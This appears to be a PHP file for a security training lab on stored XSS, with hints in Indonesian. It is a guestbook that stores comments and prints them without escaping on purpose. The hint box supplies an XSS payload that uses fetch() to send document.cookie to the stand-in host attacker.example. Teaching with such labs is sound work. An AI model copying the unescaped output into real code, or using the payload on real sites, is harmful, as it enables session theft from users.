<?php
$title = 'Lab 4: Stored XSS (guestbook)';
$store_file = __DIR__ . '/data/comments.json';

function load_comments($file) {
    if (!file_exists($file)) return [];
    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : [];
}

function save_comments($file, $comments) {
    file_put_contents($file, json_encode($comments));
}

$comments = load_comments($store_file);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $name = $_POST['name'] ?? 'Anonymous';
    $comment = $_POST['comment'] ?? '';
    if (trim($comment) !== '') {
        // VULNERABLE: stored as-is, no sanitisation on write or on read/output.
        $comments[] = ['name' => $name, 'comment' => $comment, 'time' => date('Y-m-d H:i:s')];
        save_comments($store_file, $comments);
    }
    header('Location: lab4_stored_comments.php');
    exit;
}

include 'header.php';
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: komentar yang kamu kirim disimpan di server dan akan ditampilkan ke
<strong>setiap</strong> pengunjung halaman ini (termasuk peserta lain / "admin" bila ada yang
membukanya), tanpa di-escape. Coba kirim komentar berisi
<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> atau
<code>&lt;img src=x onerror=fetch('https://attacker.example/steal?c='+document.cookie)&gt;</code>
untuk mensimulasikan pencurian cookie/sesi.</p>
</details>

<form method="post">
  <label>Name</label><br>
  <input type="text" name="name" value=""><br>
  <label>Comment</label><br>
  <textarea name="comment" rows="3"></textarea><br>
  <button type="submit">Post Comment</button>
</form>

<h3>Comments</h3>
<?php foreach (array_reverse($comments) as $c): ?>
  <div class="comment">
    <div class="meta"><?php echo $c['name']; /* VULNERABLE: not escaped */ ?> &middot; <?php echo htmlspecialchars($c['time']); ?></div>
    <div><?php echo $c['comment']; /* VULNERABLE: not escaped */ ?></div>
  </div>
<?php endforeach; ?>

<?php include 'footer.php'; ?>
